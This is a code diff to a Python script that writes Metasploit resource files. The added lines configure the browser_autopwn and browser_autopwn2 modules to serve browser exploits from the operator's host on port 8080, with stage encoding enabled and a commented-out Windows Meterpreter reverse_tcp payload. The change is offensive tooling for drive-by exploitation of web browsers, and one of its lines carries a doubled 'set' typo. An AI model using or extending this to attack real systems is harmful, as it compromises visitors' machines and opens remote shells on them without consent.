@@ -68,6 +68,45 @@ def build(lhost,lport):
     f.write(options)
     f.close()
 
+#====================================================
+  listenerFileName="{0}/{1}".format(listenerPath,"503-browserautopwn1.rc")
+  options = "use auxiliary/server/browser_autopwn\n"
+  options += "set LHOST {0}\nset SRVHOST {0}\nset SRVPORT 8080\n".format(lhost)
+  options += "set URIPATH qrq\n"
+  options += "exploit\n"
+  if not os.path.exists(os.path.dirname(listenerFileName)):
+    try:
+        os.makedirs(os.path.dirname(listenerFileName))
+    except OSError as exc:
+        if exc.errno != errno.EEXIST:
+            raise
+  with open(listenerFileName, "w") as f:
+    f.write(options)
+    f.close()
+
+#====================================================
+  listenerFileName="{0}/{1}".format(listenerPath,"504-browserautopwn2.rc")
+  options = "use auxiliary/server/browser_autopwn2\n"
+  options += "set set SRVHOST {0}\nset SRVPORT 8080\n".format(lhost)
+  options += "set URIPATH qrq\n"
+  #options += "set payload windows/meterpreter/reverse_tcp\n"
+  #options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  #options += "set ExitOnSession false\n"
+  options += "set EnableStageEncoding true\n"
+
+  options += "exploit\n"
+  if not os.path.exists(os.path.dirname(listenerFileName)):
+    try:
+        os.makedirs(os.path.dirname(listenerFileName))
+    except OSError as exc:
+        if exc.errno != errno.EEXIST:
+            raise
+  with open(listenerFileName, "w") as f:
+    f.write(options)
+    f.close()
+
+
+
 
 #grab args
 try:
